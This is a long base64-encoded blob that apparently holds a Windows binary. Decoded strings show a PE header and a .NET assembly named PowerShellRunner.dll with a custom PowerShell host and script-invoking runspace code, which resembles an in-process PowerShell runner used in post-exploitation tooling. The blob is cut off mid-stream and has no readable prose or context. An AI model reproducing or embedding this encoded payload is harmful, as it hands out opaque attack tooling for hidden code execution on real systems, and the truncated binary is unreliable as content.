AAAAnQJHZXRQcm9jQWRkcmVzcwAAqANMb2FkTGlicmFyeVcAAEtFUk5FTDMyLmRsbAAAT0xFQVVUMzIuZGxsAACtBFJ0bFVud2luZADIAUdldENvbW1hbmRMaW5lQQAOAkdldEN1cnJlbnRUaHJlYWRJZAAALwNIZWFwQWxsb2MAIQFFbmNvZGVQb2ludGVyAP4ARGVjb2RlUG9pbnRlcgBABFJhaXNlRXhjZXB0aW9uAABQAkdldExhc3RFcnJvcgAAMwNIZWFwRnJlZQAAbQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50AGcDSXNEZWJ1Z2dlclByZXNlbnQAJQFFbnRlckNyaXRpY2FsU2VjdGlvbgAAogNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAACwVTZXRMYXN0RXJyb3IAAFEBRXhpdFByb2Nlc3MAZgJHZXRNb2R1bGVIYW5kbGVFeFcAANEDTXVsdGlCeXRlVG9XaWRlQ2hhcgDNBVdpZGVDaGFyVG9NdWx0aUJ5dGUAogJHZXRQcm9jZXNzSGVhcAAAwAJHZXRTdGRIYW5kbGUAAD4CR2V0RmlsZVR5cGUABQFEZWxldGVDcml0aWNhbFNlY3Rpb24AvgJHZXRTdGFydHVwSW5mb1cAYgJHZXRNb2R1bGVGaWxlTmFtZUEAAC0EUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIACgJHZXRDdXJyZW50UHJvY2Vzc0lkANYCR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUAJwJHZXRFbnZpcm9ubWVudFN0cmluZ3NXAACdAUZyZWVFbnZpcm9ubWVudFN0cmluZ3NXAIIFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABDBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgBIA0luaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAUgVTbGVlcAAJAkdldEN1cnJlbnRQcm9jZXNzAGEFVGVybWluYXRlUHJvY2VzcwAAcwVUbHNBbGxvYwAAdQVUbHNHZXRWYWx1ZQB2BVRsc1NldFZhbHVlAHQFVGxzRnJlZQBnAkdldE1vZHVsZUhhbmRsZVcAAOEFV3JpdGVGaWxlAGMCR2V0TW9kdWxlRmlsZU5hbWVXAAByA0lzVmFsaWRDb2Rl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egIoIwAACn0BAAAEAnMPAAAGfQIAAAQCKCQAAAoAKoICczsAAAZ9BAAABAIoJQAACgAAAnMmAAAKfQMAAAQAKj4AAnsDAAAEBW8nAAAKJipOAAJ7AwAABHIjAwBwbycAAAomKmYAAnsDAAAEBXIjAwBwKCgAAApvJwAACiYqPgACewMAAAQDbycAAAomKmYAAnsDAAAEcicDAHADKCgAAApvKQAACiYqZgACewMAAARyNwMAcAMoKAAACm8pAAAKJio+AAJ7AwAABANvKQAACiYqZgACewMAAARyRwMAcAMoKAAACm8pAAAKJipmAAJ7AwAABHJbAwBwAygoAAAKbykAAAomKhIAKwAqEzABABEAAAADAAARAAJ7AwAABG8qAAAKCisABioyAHJvAwBwcyIAAAp6MgBy0gQAcHMiAAAKejIAckcGAHBzIgAACnoyAHLGBwBwcyIAAAp6AAAAEzABAAwAAAAHAAARAAJ7BAAABAorAAYqMgByRQkAcHMiAAAKejIAcqwKAHBzIgAACnoAABMwAQAMAAAACAAAEQACewkAAAQKKwAGKiYAAgN9CQAABCoAABMwAQAMAAAACQAAEQACewwAAAQKKwAGKiYAAgN9DAAABCoAABMwAQAMAAAACgAAEQACewYAAAQKKwAGKiYAAgN9BgAABCoAABMwAQAMAAAACwAAEQACewcAAAQKKwAGKiYAAgN9BwAABCoyAHIvDABwcyIAAAp6ABMwAQAMAAAACAAAEQACewgAAAQKKwAGKiYAAgN9CAAABCoyAHJ5DABwcyIAAAp6MgByxQwAcHMiAAAKehMwAQAMAAAACQAAEQACewoAAAQKKwAGKhMwAQAMAAAACQAAEQACewsAAAQKKwAGKjIAcgcNAHBzIgAACnoyAHJsDgBwcyIAAAp6MgByvA4AcHMiAAAKejIAcggPAHBzIgAACnoTMAEADAAAAAoAABEAAnsNAAAECisABiomAAIDfQ0AAAQqAAATMAEADAAAAAkAABEAAnsFAAAECisABiomAAIDfQUAAAQqAAATMAEADAAAAAMAABEAAnsOAAAECisABiomAAIDfQ4AAAQqAAATMAMAAgEAAAwAABECEgD+FRQAAAESAB94KCsAAAoAEgAfZCgsAAAKAAZ9BQAABAISAf4VFQAAARIBFigtAAAKABIBFiguAAAK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AAEAbQcAAAIAVQcAAAMAdQcAAAEAbQcAAAIAVQcAAAMAggcAAAQAigcAAAEAbQcAAAIAVQcAAAMAmAcAAAQAoQcAAAUArAcAAAYAwwcAAAEAbQcAAAIAVQcAAAMAmAcAAAQAoQcAAAEATwcAAAEATwcAAAEATwcAAAEATwcAAAEATwcAAAEAywcAAAEAwwcAAAEA1QcAAAIA3AcAAAMA6AcAAAQA7QcAAAEAywcAAAIA7QcAAAEA8gcAAAIA+QcAAAEATwcAAAEATwcAAAEATwfRAAYBagDZAAYBagDhAAYBagDpAAYBagDxAAYBagD5AAYBagABAQYBagAJAQYBagARAQYBQgEZAQYBagAhAQYBagApAQYBagAxAQYBRwFBAQYBPABJAQYBGABRAS4KTgFRAVEKVAFhAYMKWwFpAZIKGABpAaAKZgFxAcEKbAF5Ac4KagAMAOAKegGBAf0KgAF5AQwLagBxARALigGRASMLGAARAEkBMgAJAAYBGAAxAAYBrQGZAUMLvQGZAXEBNwCZAYQBNwChAQYBagApAG0LyAERAAYBGAAZAAYBGABBAAYBGABBAHULzQGpAYML0wFBAIoLzQEJAJULKQChAJ4LPAChAKgLPACpALMLPACpALkLPAAhAAYBGAAuAAsAAAIuABMAFgIuABsAFgIuACMAFgIuACsAAAIuADMAHAIuADsAFgIuAEsAFgIuAFMANAIuAGMAXgIuAGsAawIuAHMAdAIuAHsAfQKTAaQBqQGzAbgBwwHZAd4B4wHoAe0B8QEDAAEABAAHAAUACQAAAPYBQQAAAAECRgAAADUBSgAAAAYCTwAAAAkCVAAAABgCVAAAAPoDRgAAAAEEtQAAAIIGKwEAAJIGMAEAAJ0GNQEAAKwGOgEAALcGKwEAAMcGPgEAANQGMAEAAOoGMAEAAPgGNQEAAAcHMAEAABIHRgACAAMAAwACAAQABQACAAUABwACAAYACQACAAcACwACAAgADQACABoADwACAB8AEQACACIAEwABACMAEwACACQAFQABACUAFQABACcAFwACACYAFwABACkAGQACACgAGQACACsAGwABACwAGwACAC4AHQACAC8AHwACADAAIQACADUAIwABADYAIwACADcAJQABADgAJQACADkAJwABADoAJwByAQSAAAABAAAAAAAAAAAAAAAAAB8AAAACAAAAAAAAAAAAAAABAHUAAAAAAAEAAAAAAAAAAAAAAAoAjAAAAAAAAwACAAQAAgAFAAIAAAAAPE1vZHVsZT4AUG93ZXJTaGVsbFJ1bm5lci5kbGwAUG93ZXJTaGVsbFJ1bm5lcgBDdXN0b21QU0hvc3QAQ3VzdG9tUFNIb3N0VXNlckludGVyZmFjZQBDdXN0b21QU1JIb3N0UmF3VXNlckludGVyZmFjZQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24AU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5Ib3N0AFBTSG9zdABQU0hvc3RVc2VySW50ZXJmYWNlAFBTSG9zdFJhd1VzZXJJbnRlcmZhY2UASW52b2tlUFMALmN0b3IAR3VpZABfaG9zdElkAF91aQBnZXRfSW5zdGFuY2VJZABnZXRfTmFtZQBWZXJzaW9uAGdldF9WZXJzaW9uAGdldF9VSQBTeXN0ZW0uR2xvYmFsaXphdGlvbgBDdWx0dXJlSW5mbwBnZXRfQ3VycmVudEN1bHR1cmUAZ2V0X0N1cnJlbnRVSUN1bHR1cmUARW50ZXJOZXN0ZWRQcm9tcHQARXhpdE5lc3RlZFByb21wdABOb3RpZnlCZWdpbkFwcGxpY2F0aW9uAE5vdGlmeUVuZEFwcGxpY2F0aW9uAFNldFNob3VsZEV4aXQASW5zdGFuY2VJZABOYW1lAFVJAEN1cnJlbnRDdWx0dXJlAEN1cnJlbnRVSUN1bHR1cmUAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBfc2IAX3Jhd1VpAENvbnNvbGVDb2xvcgBXcml0ZQBXcml0ZUxpbmUAV3JpdGVEZWJ1Z0xpbmUAV3JpdGVFcnJvckxpbmUAV3JpdGVWZXJib3NlTGluZQBXcml0ZVdhcm5pbmdMaW5lAFByb2dyZXNzUmVjb3JkAFdyaXRlUHJvZ3Jlc3MAZ2V0X091dHB1dABTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBEaWN0aW9uYXJ5YDIAUFNPYmplY3QAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBGaWVsZERlc2NyaXB0aW9uAFByb21wdABDaG9pY2VEZXNjcmlwdGlvbgBQcm9tcHRGb3JDaG9pY2UAUFNDcmVkZW50aWFsAFBTQ3JlZGVudGlhbFR5cGVzAFBTQ3JlZGVudGlhbFVJT3B0aW9ucwBQcm9tcHRGb3JDcmVkZW50aWFsAGdldF9SYXdVSQBSZWFkTGluZQBTeXN0ZW0uU2VjdXJpdHkAU2VjdXJlU3RyaW5nAFJlYWRMaW5lQXNTZWN1cmVTdHJpbmcAT3V0cHV0AFJhd1VJAFNpemUAX3dpbmRvd1NpemUAQ29vcmRpbmF0ZXMAX2N1cnNvclBvc2l0aW9uAF9jdXJzb3JTaXplAF9mb3JlZ3JvdW5kQ29sb3IAX2JhY2tncm91bmRDb2xvcgBfbWF4UGh5c2ljYWxXaW5kb3dTaXplAF9tYXhXaW5kb3dTaXplAF9idWZmZXJTaXplAF93aW5kb3dQb3NpdGlvbgBfd2luZG93VGl0bGUAZ2V0X0JhY2tncm91bmRDb2xvcgBzZXRfQmFja2dyb3VuZENvbG9yAGdldF9CdWZmZXJTaXplAHNldF9CdWZmZXJTaXplAGdldF9DdXJzb3JQb3NpdGlvbgBzZXRfQ3Vyc29yUG9zaXRpb24AZ2V0X0N1cnNvclNpemUAc2V0X0N1cnNvclNpemUARmx1c2hJbnB1dEJ1ZmZlcgBnZXRfRm9yZWdyb3VuZENvbG9yAHNldF9Gb3JlZ3JvdW5kQ29sb3IAQnVmZmVyQ2VsbABSZWN0YW5nbGUAR2V0QnVmZmVyQ29udGVudHMAZ2V0X0tleUF2YWlsYWJsZQBnZXRfTWF4UGh5c2ljYWxXaW5kb3dTaXplAGdldF9NYXhXaW5kb3dTaXplAEtleUluZm8AUmVhZEtleU9wdGlvbnMAUmVhZEtleQBTY3JvbGxCdWZmZXJDb250ZW50cwBTZXRCdWZmZXJDb250ZW50cwBnZXRfV2luZG93UG9zaXRpb24Ac2V0X1dpbmRvd1Bvc2l0aW9uAGdldF9XaW5kb3dTaXplAHNldF9XaW5kb3dTaXplAGdldF9XaW5kb3dUaXRsZQBzZXRfV2luZG93VGl0bGUAQmFja2dyb3VuZENvbG9yAEJ1ZmZlclNpemUAQ3Vyc29yUG9zaXRpb24AQ3Vyc29yU2l6ZQBGb3JlZ3JvdW5kQ29sb3IAS2V5QXZhaWxhYmxlAE1heFBoeXNpY2FsV2luZG93U2l6ZQBNYXhXaW5kb3dTaXplAFdpbmRvd1Bvc2l0aW9uAFdpbmRvd1NpemUAV2luZG93VGl0bGUAY29tbWFuZABleGl0Q29kZQBmb3JlZ3JvdW5kQ29sb3IAYmFja2dyb3VuZENvbG9yAHZhbHVlAG1lc3NhZ2UAc291cmNlSWQAcmVjb3JkAGNhcHRpb24AZGVzY3JpcHRpb25zAGNob2ljZXMAZGVmYXVsdENob2ljZQB1c2VyTmFtZQB0YXJnZXROYW1lAGFsbG93ZWRDcmVkZW50aWFsVHlwZXMAb3B0aW9ucwByZWN0YW5nbGUAc291cmNlAGRlc3RpbmF0aW9uAGNsaXAAZmlsbABvcmlnaW4AY29udGVudHMAU3lzdGVtLlJlZmxlY3Rpb24AQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q3VsdHVyZUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAQ29tVmlzaWJsZUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAEFzc2VtYmx5VmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAFN5c3RlbS5EaWFnbm9zdGljcwBEZWJ1Z2dhYmxlQXR0cmlidXRlAERlYnVnZ2luZ01vZGVzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBJbml0aWFsU2Vzc2lvblN0YXRlAENyZWF0ZURlZmF1bHQAQXV0aG9yaXphdGlvbk1hbmFnZXIAc2V0X0F1dGhvcml6YXRpb25NYW5hZ2VyAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAQ29tbWFuZABnZXRfSXRlbQBQaXBlbGluZVJlc3VsdFR5cGVzAE1lcmdlTXlSZXN1bHRzAEFkZABJbnZva2UASURpc3Bvc2FibGUARGlzcG9zZQBTeXN0ZW0uVGhyZWFkaW5nAFRocmVhZABnZXRfQ3VycmVudFRocmVhZABOb3RJbXBsZW1lbnRlZEV4Y2VwdGlvbgBOZXdHdWlkAEFwcGVuZABTdHJpbmcAQ29uY2F0AEFwcGVuZExpbmUAVG9TdHJpbmcAc2V0X1dpZHRoAHNldF9IZWlnaHQAc2V0X1gAc2V0X1kAAAAXbwB1AHQALQBkAGUAZgBhAHUAbAB0AAEZQwB1AHMAdABvAG0AUABTAEgAbwBzAHQAAIF3RQBuAHQAZQByAE4AZQBzAHQAZQBkAFAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgXVFAHgAaQB0AE4AZQBzAHQAZQBkAFAAcgBvAG0AcAB0ACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABAwoAAA9EAEUAQgBVAEcAOgAgAAAPRQBSAFIATwBSADoAIAAAE1YARQBSAEIATwBTAEUAOgAgAAATVwBBAFIATgBJAE4ARwA6ACAAAIFhUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBc1AAcgBvAG0AcAB0AEYAbwByAEMAaABvAGkAYwBlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgX1QAHIAbwBtAHAAdABGAG8AcgBDAHIAZQBkAGUAbgB0AGkAYQBsADEAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBfVAAcgBvAG0AcAB0AEYAbwByAEMAcgBlAGQAZQBuAHQAaQBhAGwAMgAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYFlUgBlAGEAZABMAGkAbgBlACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAd